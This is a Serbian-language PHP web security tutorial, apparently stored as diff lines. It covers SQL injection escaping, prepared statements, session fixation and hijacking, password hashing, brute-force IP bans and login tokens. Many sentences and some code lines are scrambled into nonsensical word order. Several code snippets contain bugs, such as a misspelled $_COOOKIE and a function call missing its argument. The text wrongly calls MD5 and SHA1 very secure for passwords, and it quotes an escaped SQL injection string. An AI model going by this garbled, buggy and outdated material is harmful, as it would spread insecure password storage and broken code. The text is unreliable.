+ili drajveri, ovakvog dozvoljavaju, izvšenje to podržano predstavlja PostgreSQL drugi SQLite, npr u koda više tako Izvšenje funkciji, pa ali ozbiljan nije sigurnosni propust  upita mysql_query() odjednom za . 
+Zaštita . 
+Kao što je već spominjano u ranijim glavama, filtriranje inputa može sprečiti većinu sigurnosnih problema i obavezna je stavka sigurne aplikacije. 
+da podatke filtrirali koristimo jednosmerne apostrofe, sigurno bismo sigurnost  korisniku na za tako primer na karaktera specijalnih lozinke unos primer SQL enkripcije, i da možemo zabranimo md5, povećali bismo Ukoliko za specifičnih upite, . 
+Međutim,postoje i druge metode za sprečavanje napada, a da dozvolimo sve karaktere: 
+inputa Escape mysql_real_escape_string() – . 
+Pripremljeni izrazi . 
+mysql_real_escape_string() . 
+ne karakteri deo stringa specijalni se izmeni drajver u dalje i poseduje upita  i upita svi eskejpovani, osigurava funkcija mysqli pravilno Ova ponašaju je pripada drajveru, pri kao iskoriste da građenju ali biti mysql sastavni da i (mysqli_real_escape_string) odnosno i će tog nikako . 
+promenjivima nad funkcija i "best se izvršiti Ova svim je mora koji upit  practice" grade . 
+ . 
+$username = mysql_real_escape_string($_POST['username']); . 
+Upit za gore navedeni primer nakon eskejpovanja-a promenjivih izgleda ovako: 
+ . 
+password 'a\' * korisnici OR WHERE = FROM AND = \'\1\'=\'1' \'1\'=\'1' OR SELECT username 'a\' . 
+i zaštićen je od SQL injection napada. 
+Pošto ove funkcije za eskejpovanje pripadaju drajveru za rad sa bazom podataka, sve kose crte "\" neće biti unete sa ostalim podacima u bazu, što nije slučaj u korišćenju addslashes funkcije. 
+normalizovati, magic_quotes_gpc, podaci tek Pretpostavka se onda da je pa suprotom u je moraju isključen eskejpovati  Napomena: . 
+objašnjena ranije  Normalizacija je podataka . 
+ 
+(Prepared Pripremljeni statements) izrazi . 
+da je tolika novost, koji to programeri koriste, velika početnici ali slabog razumevanja na rade  izrazi izbegavaju Pripremljeni ih zbog verovatno načina nisu a mnogi . 
+što pripremljeni drajvera, koriste izrazi kao Pre da da napomenuti je mysql  se ne svega, treba starim verzijama standaradni u mogu . 
+odavno starijeg se je je kao se da razvoj Čak je što i i PHP su drajveri MySQLi Takoreći, preporuka obustavljen  dalji on drajver koriste PDO  i datuma iz potpuno mysql njegov i da konzorcijuma izbaci korišćenja . 
+Ova poseduju dosta sigurnosnih dosta drajvera karakteristika  i brži su dva . 
+same ne koji pa građenje postoji na načina odvija serveru  odnosno zbog stoga ni izraza, radi, upita a na u se njegovo mogućnost izmene serveru, aplikaciji, na Priprema php MySQL . 
+Prilikom pisanja upita, umesto promenjivih vrednosti koriste se operater "?", a promenjive se šalju posebnom funkcijom, onim redosledom kakvim se ubacuju u upit. 
+Sledeći kôd opisuje rad MySQLi drajvera i pripremljenih izraza: 
+ . 
+<?php . 
+= $username $_POST['username']; . 
+$_POST['password']; = $password . 
+ . 
+// bazom sa Konekcija MySQL . 
+$mysqli = 'user', 'password', 'world'); new mysqli('localhost', . 
+ 
+WHERE = ? $stmt korisnici = $mysqli->prepare("SELECT * FROM username . 
+AND password = ? 
+LIMIT 1"); . 
+// Vrednosti upit u se šalju promenjivih na . 
+$stmt->bind_param('ss', $username, $password); 
+ . 
+upita // izvršavanje . 
+$stmt->execute(); . 
+ . 
+if($stmt->affected_rows > 0) { 
+	// ulogovan korisnik je . 
+} . 
+ 
+//    . 
+ . 
+i zatvaranje // upita izraza . 
+$stmt->close(); . 
+?> . 
+ . 
+Više o MySQLi drajveru i njegovim funkcionalnostima možete saznati na adresi: http://php.net/manual/en/book.mysqli.php 
+ . 
+Sesije . 
+statičan protokol osnovu HTTP na uloga je mu stranu  zahteva glavna prikaže je HTML i da . 
+i servera između prikaže, klijentu server Kada odgovor klijenta dokumenta, svaka pošalje veza se vidu HTML odnosno je u raskida  kada . 
+Pošto web serveri nemaju mogućnost održavanja veze između klijenta i servera, a iz razloga da savremeni poslovni i programerski izazovi nameću da se kroz HTTP omogući konstanto održavanje veze, nastao je PHP sistem za upravljanje sesijama. 
+ga razumeti da sigurnosne upravljamo sistemom, Da predvideti pravilno znali sve i dobro ovim moguće propuste  moramo bismo . 
+ 
+znamo se korisniku nam da za namenjen radi individualno  posetiocima, o mu da sadržaj je Sesije pri serviramo veću i da zahtevu izgradimo sa da određenom baš svakom interakciju koji njega, omogućavaju . 
+Takođe, upišemo koristimo taj povećamo poseti statistiku  u brojač podatke da mogli prvoj sesiji neke i u poseta pri i brojač primer, pri da ih i da svakoj poseti nulu pravimo na sačuvamo narednim i narednoj klijenta u tako zahtevima, bismo da i . 
+u imaju svakom je Međutim, konkretnom veću korisnost o radi pri aplikacija zahtevu  kojem multi-korisničke potrebno gde da PHP izgradnji "zna" se ozbiljne, korisniku aplikacije, . 
+ . 
+moraju odnosno, principu neke klijent server podatke za potrebne identifikaciju  identifikacije svakom zahtevu, rade identične i po i One imati pri . 
+Kako se identifikator sesije može ukrasti ili pod veoma malim šansama pogoditi, pa to napadaču daje mogućnost da ga naša PHP aplikacija identifikuje kao regularnog korisnika, ali ukoliko je to cilj napadača, i kao administratora sistema. 
+na se biti korisnika (podrazumevano) mogu Podaci sesiji, ili hard URL serverskoj u kolačićima na strani, o disku adrese, podataka, bazi čuvati preko poslati ili čuvati vidu ali mogu parametra  kod u u se . 
+čuvanje znatno je adrese sigurnije, jer biti razloga: je lako nesigurno otkriven je i veoma može kolačićima identifikator preko sesije i sledećih čuvanje javno zbog URL vođenje Dok ukraden, u sesije . 
+Kolačići se ne vide, odnosno šalju se kroz header zahteva 
+tako Mogu i biti (HTTPS) enkriptovani transportovani . 
+sesija mane, odnosno mogu i se tom imaju i kolačići slučaju strani održati  u mogla se klijentskoj ne isključiti Ali, bi na svoje kolačići . 
+U veoma spremni ne na žele svakom koriste aplikaciju, želeli kolačiće  ukoliko korisnika slučaju, moramo broja biti sigurnu koji da malog bismo gubitak . 
+session use_only_cookies se treba samo sesije je kolačiću, uključeno da preporuka PHP-a, ovo identifikatora postarati u U je ali verzijama je i novijim čuvanje proveriti, da uključeno: podrazumevano . 
+ 
+ini_set('session use_only_cookies', 1) . 
+ . 
+ili // preko  htaccess fajla: . 
+php_flag session.use_only_cookies on 
+Generalno, napad preko sesije se može izvesti na tri načina: 
+Pogađanje . 
+Otmica . 
+Fiksacija . 
+Pogađanje identifikatora sesije je namanje verovatan metod napada, jer je sistem za kreiranje sesije ekstremno nasumičan. 
+načina moguća napada  metoda Druga i veoma su dva često su . 
+sesija Fiksacija (Session Fixation) . 
+Na jednostavnom sistemu gde se sistem sesija koristi samo sa session_start() i podacima se pristupa preko $_SESSION globalne promenjive, svaki napadač može jednostavno kreirati svoj identifikator sesije i tako ugroziti sigurnost. 
+Dakle, fiksacija sesija predstavlja kreiranje identifikatora sesije od samog napadača i tako ignorišući PHP sistem za kreiranje identifikatora. 
+Svakako, to ne samo da može da izazove greške u radu aplikacije, već može da predstavlja i ozbiljan sigurnosni propust. 
+ . 
+Rešenje ovog problema leži u ponovnom generisanju identifikatora sesije: 
+ 
+<?php . 
+session_start(); . 
+{ (!isset($_SESSION['pokrenuta'])) if . 
+ session_regenerate_id();   . 
+=  $_SESSION['pokrenuta']  true;  . 
+} . 
+?> . 
+identifikator novi li identifikator takva biće koji pokrenuta nije, sesije generisan već  sesija prepisati da tome da će ujedno zaista ukoliko napadača  proveri je u Zaštita se je i . 
+za kôd practice" ujedno Ovaj "best sesija  kreiranje i predstavlja . 
+(Session sesija Otmica Hijacking) . 
+sesija metoda veoma može oteti je i Već se ovo da napomenuto je često napada  . 
+kolačić poseduje sistemu kojem odnosno sesije, jednostavnom je poseduje dovoljno sasvim da u da identifikator  taj identifikator napadač se čuva Na . 
+On se jednostavno može ukrasti na više načina i jedno od njih je presretanje podataka  (ukoliko se ne koristi HTTPS protokol), ili još jednostavnije, ukoliko ima pristup klijentskom računaru. 
+direktorijumu  napada o se pitanju može server i sesijama ako na napad izvesti Osim naročito zajedničkom na čuvaju server, i u podaci je se deljeni u klijenta, samog . 
+Pošto već ne možemo zaštiti korisnike od presretanja podataka i pristupa napadača njihovom računaru, možemo zakomplikovati proveru korisnika, odnosno u obzir uzeti još neke podatke o korisniku sem identifikatora sesije. 
+Možemo dodati, na primer, podatke o klijentu, odnosno User Agent: 
+<?php 
+session_start(); . 
+ . 
+if (isset($_SESSION['HTTP_USER_AGENT'])) { 
+{ != ($_SESSION['HTTP_USER_AGENT'] 	if md5($_SERVER['HTTP_USER_AGENT'])) . 
+Agent je login promenjen, User prikazati 		// . 
+		exit; 
+	} . 
+} { else . 
+	// o informacije Upisati User Agent-u . 
+md5($_SERVER['HTTP_USER_AGENT']); 	$_SESSION['HTTP_USER_AGENT'] = . 
+} . 
+?> 
+povezan žrtvin imati sem Agent, sesije, što identifikator koji sistemom imati nije mora Ovakvim User mora napadač sa sesijama  i . 
+Realno, opasnost i dalje postoji, ali i ovakvo jednostavna komplikacija i dodatne provere drastično povećavaju sigurnost. 
+smanjenje da trajanja obzir generisanje novog sigurnost  identifikatora treba kao i mogu, velikoj sesije, uzeti meri, u Takođe, povećati u češće i . 
+Autentifikacija i autorizacija korisnika 
+da kasnije Mnoge i od uloguju  zahtevaju se web registruju, aplikacije korisnika . 
+budu krađe da ujedno i korisnika, i čuvaju naša veoma korisnička i aplikacije  privatnost napada, slučajnih sigurnost web Te i metoda lozinke, aplikacije bi celokupnu je zaštićeni zaštitili oni kako a od imena bitno . 
+ . 
+se proces je osigurava Autentifikacija kojim korisničkog ispravnost identiteta  . 
+To lozinke  proveru uglavnom korisničkog jednostavnu podrazumeva imena i . 
+Autorizacija je metod pristupa zaštićenim kontolama i podacima koji omogućava samo autorizovanim korisnicima da im pristupe. 
+stranice poseduju koje stranice primer, mnoge sistema samo mogu koje korisnici  administratora ostali za Na aplikacije rezervisane posete i da su . 
+Password hashing . 
+Ukoliko bi se pravilla web aplikacija koja zahteva registraciju i login, moramo se osigurati da je sistem čuvanja lozinki siguran. Čuvanje korisničkih lozinki u bazi podataka je vema ozbiljna tema i veoma čest sigurnosni propust. 
+Ukoliko bi napadač neprimetno ukrao takvo bazu podataka, mogao bi da se prijavi na sistem baš kao bilo koji naš korisnik. 
+proverena, dobro, koliko lozinke  Ili, ukoliko bila u sve više uvid ta podataka imaju pristup ma bazi korisničke svakako lica da lica, ima nije . 
+lozinke račun prijavu mogu je sisteme, opšte kao su druge bankovni email, lozinke iste i sl  lični aplikaciji, Ne samo takve iskorišćeni korisnici na da web za biti na da poznato i štu koriste našoj . 
+naših kada kakvu korisnika aplikaciju  privatnih bilo Sigurnost web vidu pravimo treba u svakako podataka imati . 
+korišćenjem jednosmernih vrednosti hashing je enkripcija  dobijanja hash metoda Password . 
+PHP podržava dve često korišćene funkcije za jednosmernu enkripciju – MD5 (128-bit) i SHA1 (160-bit). 
+Obe funkcije su veoma sigurne i veoma malu verovatnoću koalizije.  
+ 
+md5('bilosta'); //857f25dfbe630389e5725ee8602a93e9 echo . 
+echo sha1('bilosta'); //e574cd4c81d16cca355de5cb0fd18643c20eb521 . 
+zaštitu funkcije veoma Korišćenje enkripcije je jednostavno  md5 za . 
+Prilikom registovanja, korisnička lozinka se konvertuje u hash string i kao takav čuva u bazi. 
+kao da string Sve unetu iz lozinku da uradimo hash i sa provere ga što konvertujemo u takvog treba baze  onim je da uporedimo prilikom . 
+// Registracija korisnika 
+mysql_real_escape_string($_POST['username']); = $username . 
+md5($_POST['password']); $password = . 
+ 
+VALUES korisnici = "INSERT (username, password) '$password')"; INTO $sql ('$username', . 
+ . 
+ . 
+// Provera login-a 
+= $username mysql_real_escape_string($_POST['username']); . 
+$password = md5($_POST['password']); 
+ . 
+$sql = "SELECT * FROM korisnici WHERE username = '$username' AND password = '$password'"; 
+$result = mysql_query($sql); 
+0) if(mysql_num_rows($result) { == . 
+pogrešni podaci 	// . 
+} . 
+?> . 
+force", sigurnosti mogu su "brute što I iz napad  način bolji periodu čuvanja to veće od bazi prvobitnu koje veoma lozinku  teksualnih katkom izvrši je postoje Što lozinki stringa metode vremenskom ovakav se jednostavnija, je znatno šanse uspešno izvući u ako podataka, lozinka da su u hash kao . 
+potrebno svega vrednosti  par lozinke slova brojeve 5 karaktera minuta dobijanje za bi vrednost sadrži da mala i od hash Recimo originalne za koja bilo . 
+ . 
+Bolji način čuvanja lozinki je saltovanje lozinki. 
+kompleksnost lozinke lozinki "brute priključenje predefinisanog hash sprečiti i će stringa  time force" iz Odnosno koji povećati stringa otkrivanje . 
+Za salt string možemo koristiti definisanu vrednost, koja se globalno priključuje svim lozinkama, ili da za svakog korisnika generišemo novi salt string i čuvamo ga u bazi podataka. 
+ 
+<?php . 
+define('SALT', '!"#$%&/()=$%DFGBHJfghJ$%677$%'); 
+ . 
+$password   md5(SALT = . 
+md5($_POST['password'])); . 
+U ovom slučaju svakako treba osigurati da SALT konstantu nikada nećemo menjati, u suprotnom ćemo imati problem. 
+korisnika korišćenje u Generisanje i SALT dobre korisničkog imena, za random može bazi čuvanje svakog njegove vrednosti hash od je rešenja  rezultate  jedno stringa i vrednost Čak mogućih kao dati ovakvog . 
+i njih slučaju, treba standarde svakom ovakve stvari pri projektovanju pridržavati  aplikacije se za definisati U . 
+ . 
+korisniku zahteva lozinku  ne nikada način da zaboravljenu vratiti originalnu Ovakav možemo . 
+Generisanje nove lozinke i slanje na korisnikovu email adresu je zadovoljavajuće rešenje, uz određene provere.  
+Brute force . 
+Brute force je metoda napada kojom korisnik pokušava unosom nasumičniih podaka da se identifikuje na sistemu. 
+lozinki  pomoć softvera koji u napad predefinisane tabele pritom izvrši napada, više omogućava korišćenih koristeći veoma najčešće što Najčešće, kratkom nekog koristi vremenu se uz da . 
+bi se uspeo bezbednost da posle da i korisnik, je nekog ili time vremena celog Jasno kao neki ugrozi identifikuje sistema  kao administrator . 
+Dobro rešenje za zaštitu je da napadaču zabranimo pristup sajtu na određeno vreme ukoliko se identifikuje ovakva vrsta napada. 
+na koji način izvršiti nedostatke  to i Problem od svaki je ima njih svoje prednosti jer . 
+pristupa adrese Zabrana preko IP . 
+Ukoliko otrkije se adresu mogla ovakva zapisati bi se i da zabraniti se određeno napadača, vrstua mu na IP napada, vreme  uloguje . 
+ovakav Kod opisuje je sledeći: koji način rada . 
+<?php . 
+// Provera IP adrese 
+= $ip mysql_real_escape_string($_SERVER['REMOTE_ADDR']); . 
+$now time(); = . 
+ . 
+> AND LIMIT = attempts > = * banned '$now' WHERE $sql AND '$ip' ip 1"; 3 expire FROM "SELECT . 
+$result = mysql_query($sql); 
+> 0) { if(mysql_num_rows($result) . 
+pristup zabraniti 	// . 
+	exit; 
+} . 
+ . 
+podataka // Provera korisničkih . 
+= $username mysql_real_escape_string($_POST['username']); . 
+md5(SALT   $_POST['password']); $password = . 
+ 
+* WHERE password username FROM korisnici = = $sql = '$password'"; '$username' "SELECT AND . 
+$result = mysql_query($sql); 
+== if(mysql_num_rows($result) { 0) . 
+	// pogrešni podaci 
+= 	$expire pristupa time()+60*15; // zabrana na minuta 15 . 
+	$sql = "INSERT INTO banned (ip, expire, attempts) VALUES ('$ip', '$expire', 1) " 
+	     . "ON DUPLICATE KEY UPDATE expire = '$expire', attempts = attempts+1"; 
+	mysql_query($sql); . 
+	 . 
+grešku  prikaži 	// . 
+	exit; . 
+} 
+//    . 
+?> . 
+I ako je ovaj način relativno dobar, teoretski, ozbiljni napadači mogu da koriste proxy servere i tako svaki put imati drugu IP adresu. 
+Međutim, ukoliko je zaštita na samom severu dobro postavljena, veliki broj zahteva ovakvog tipa će biti zaustavljen i pre nego što dođe do aplikacije i ovakav način zaštite je sasvim dovoljan za prosečne web aplikacije. 
+ . 
+zabrane određenom mogu ili zabrana korišćenjem korišćenjem i pristupa i drugi korisniku  se Postoje načini obaveznim čak sesija, JavaScripta, pristupa izvesti . 
+bi pa određeno tako pogreši više lozinku, mogli puta gore veoma možemo sličan mu vreme  na dodali bismo pokušaja, sistem pristup tabelu koji zabraniti u entitet korisnika tako ukoliko broj označava nam kao jedan Tačnije, se korisnik što napraviti . 
+Dugotrajno sesija održavanje . 
+određeno odnosno da svakako zapamti je aplikacije sesija  našu web dugotrajno na autentifikaciju Dobra opcija  vreme, održavanje . 
+bi korisnik unosi ponovo rečima, sutra uloguje danas podatke  na svakoj se bude sistem, želeo pri da korisničke Prostim umesto ulogovan, poseti ukoliko da i . 
+i se zahtevu proverava  često Veoma koristili bi ono i u rizik  i korišćeno) loše da cookie lozinke, ime da (a smesti lozinka korisničko enkripciju Čak i rešenje te svakom sigurnosni sistem kada pri se je ovakav predstavlja . 
+ 
+nam može koji tokena, sesija za održavanje izvršiti cookie-u, se identifikaciju  korišćenjem Dugotrajno vrednosti služi odnosno u . 
+Problem nastaje pri korišćenju nesigurnih veza, odnosno nepostojanje HTTPS veze koja bi osigurala siguran transfer tokena. 
+Postoji velika mogućnost da napadač može takav cookie da ukrade i da se uz pomoć njega idenfikuje na našem sajtu. 
+da napadaču  otežamo zadatak više je što Međutim, naš mogućnost ovu . 
+koji ne svakako bude svakog bilo da kakve unikatan Token korisnika, podatke  korisničke za treba sadrži . 
+možemo token napraviti: Takav lako . 
+ . 
+$token md5(uniqid(rand(), TRUE)); = . 
+u trebalo i podataka  bi da poseduje odnosno klijent server, Ovakav našoj i u svom token korisnik cookie-u mi, i bazi i . 
+ovako: autentifikacija izledala Jednostavna bi . 
+<?php 
+if(isset($_COOKIE['token'])) { 
+ . 
+	$token mysql_real_escape_string($_COOOKIE['token']); = . 
+	 . 
+	$sql = "SELECT * FROM korisnici WHERE token = '$token'"; 
+	$result = mysql_query($sql); 
+== 	if(mysql_num_rows { 0) . 
+		// token je istekao . 
+= 		$korisnik FALSE; . 
+		exit; . 
+	} else { . 
+je 		// ulogovan korisnik . 
+TRUE; 		$korisnik = . 
+	} . 
+} . 
+//... 
+?> . 
+ 
+mogao se čak iskoristi veoma ukradeni osiguralo da pri token, token  napadač i zahtevu pa svakom ne da Kako promenimo često, bi možemo bi da . 
+Ovo je skupa operacija, jer pri svakom zahtevu moramo imati UPDATE upit. 
+sistema: korišćenje za Ali ovakvog saveti generalno, . 
+čuvanje najviše do predugo treba nedelju Ne dana omogućavati tokena, . 
+promeniti svakoj token Pri autentifikaciji . 
+sesija  očuvanje dok izbegne da za dugotrajno sistem resursima bi autorizaciju trebao administrator Ovakav ka koristiti samo korisnika, . 
+Upravljanje greškama 
+su "Bugovi" web u deo sastavni programiranja  aplikaciji . 
+nemoguće "iz je aplikaciju grešku  ona (naročito napiše da sadrži početnik) a Prosto da prve", ne programer neku . 
+mnogo sa teže rešavati se opcija problem ih  funkcionalnošću porastom Ovaj uočiti greške te naročito gde i javlja i brojem aplikacije, je . 
+Greške koje se prave u PHP programiranju su ništa drugačije od onih u svim drugim programskim jezicima,  i generalno mogu biti: 
+Matematičke – deljenje sa nulom, problemi sa operacijama, zaokruživanjem i sl. 
+Logičke – beskonačne petlje ili beskonačne rekurzije, problemi sa petljama 
+i  pogrešnog – operatora korišćenje sl  Sintaksne . 
+Resursi i promenjive, – neicijalizovane podataka sa sl  sa pogrešnim memorijom, korišćenje rad problemi tipovima . 
+samo još u Veoma sinaksnih grešaka korisni je ali razvoju  u stadijumu error_reporting, za rešavanje uvek aplikacija je dok direktiva . 
+bi postavljena trebalo trebalo aplikacija dalje računa prikazivati Ukoliko korisnicima je greške, ne o i "live", nijma  web voditi ali bi . 
+error_reporting(E_ALL | E_STRICT); 
+0); ini_set("display_errors", . 
+1); ini_set("log_errors", . 
+ini_set("error_log", "/home/user/logs/php_logs log"); . 
+ne budu služi Prva linija da sinaksne odštampane svih greške, što upozorenja za i grešaka, dok obaveštenja, one su ekranu  uključenje na kao služi druga linija . 
+Treća linija osigurava da se sve greške loguju, a četvrta je samo putanja do fajla gde želimo da čuvamo sve logove. 
+Logove sa greškama treba redovno proveravati jer najveći broj bug-ova će baš u njima biti zapisan. 
+Takođe, prilikom pravljenja alikacije preporučljivo je i napraviti sistem za upravljanje greškama. 
+ne kojoj sanirala  se još logovati i uočljiva pre bila ih, objašnjenjem, upite ih nastala, primer, email kôda datotekom vreme koji ovakav može sistem izvrše, kako poslati nam i što na sa adresu, sve se logovati greška bolje, u linijom detaljnim Na je bi da na greška ili mogu . 
+ 
+Opšte sigurnost za web aplikacija preporuke . 
+zbog mogu slučajevima Internet i dorađivati u ceo linija Na nesigurnim pasti sekundi, ili trud građeno jedne pa u karakteristiku, programiranjem samo ulagati kao i koji stalno Štete već gledati u poslovanje na biti se nekim godinama treba nesrazmerive, sigurnost na kao naročito tako može usavršavati par ne nastale proces kôda  njega   treba naš i . 
+često programeri trude aplikacije neće koja se dešava doći se sigurnost red  ostavljaju i aplikacija na i sigurnost razvoja za Veoma kasniju uglavnom ignorišu fazu, tokom a nikada da da "proradi", . 
+i otporna pristup ako To greškama  da uvek treba dobro smo bude umu imati i aplikacija pogrešan pravilno da da napade upravlja i na radi na što nije zamislili, veoma već ono dovoljno je . 
+Dakle, sigurnost aplikacije treba uzimati u obzir u ranim fazama razvoja i već pri projektovanju napraviti dobar koncept kojeg se treba pridržavati tokom celog razvoja.  
+ 
+Takav sledeću metadologiju: svakako, sadržati treba koncept, . 
+Bezbednost arhitekture aplikativne . 
+greškama Upravljanje . 
+Filtriranje validacija i inputa . 
+Testiranje 
+Već je spomenuto da sigurnost naše aplikacije zavisi i od sigurnosti servera na kojem se nalazi. 
+zastreo podataka da server ugrožena  Ukoliko i softver, i poseduje naša i je ranjiv aplikacija baza je verovatnoća velika takav . 
+Svakako je najbolje rešenje imati celoukpnu kontrolu nad serverom i voditi računa da je softver uvek "up to date". 
+Međutim, često to iz finansijskih razloga nije moguće pa smo opredeljeni za zakup hostinga na nekom serveru. 
+koji birati aplikativnog uzdati previše tome  ne U o sisteme kvalitetne bekapa se proverene ozbiljan u tom softvera, provajdere uvek imaju bezbednosti već pristup slučaju podataka, i njihove hosting brinuti samostalno . 
+ . 
+razvoja sistema Projektovanje taj fazi prilikom a za se aplikacije, obzir treba oslanjati na uzeti u izgradnje najranijoj upravljanje u sistem  greškama . 
+koja programere detalja i za o sadrži strane, tehničke grešci, treba toj grešci, detalje mesto strane nastanka  više što sadrži greške ne obaveštenje koje greškama da otkrivaju upravljanje a za druge Dobar tehničkih jedne nastaloj nikakve sa korisnike za uzrok koji sistem sa sadrži obaveštenje o . 
+primer služe alate PHP u grešaka, na i kao Svakako, uzeti koji obzir za treba pronalaženje Unit  . 
+ 
+U ovom kursu je mnogo puta spominjana važnost filtriranja inputa i to je najvredniji savet koga se treba pridržavati. 
+Uvek treba razmišljati u kritičnom stavu, osmisliti najgori scenario i sprečiti ga. 
+treba imati je već nikada na i ne treba umu  uvek Kao što to napisano, "korisniku verovati" . 
+Filtrirati svaki input, proveravati i najmanje moguće greške kao što su dužina stringa i slične, i nikada se ne uzdati u mogućnost HTML-a i JavaScripta za validaciju inputa. 
+Koliko god dobro zaštitili našu formu JavaScript funkcijama, one uvek mogu biti zaobiđene, kao i sve što se izvršava na klijentskoj strani. 
+ 
+viši podići na testiranjem  može se Bezbednost najlakše nivo prostim . 
+način na uzmite i razmišljajte aplikaciju  obzir Jednostavno, scenarije napadač, sve moguće kao koristite taj u . 
+formular, prazan stvari  Krenite neispravne isključite JavaScript pošaljite – Injection  SQL unesite pokušajte od podatke, i prostih . 
+vašom napada, metode su aplikacijom  opisane kursu nad U svaku pa najčešće korišćene ovom isprobajte . 
+Ukoliko otkrijete i najmanji mogući propust, rešite ga odmah. 
+ . 
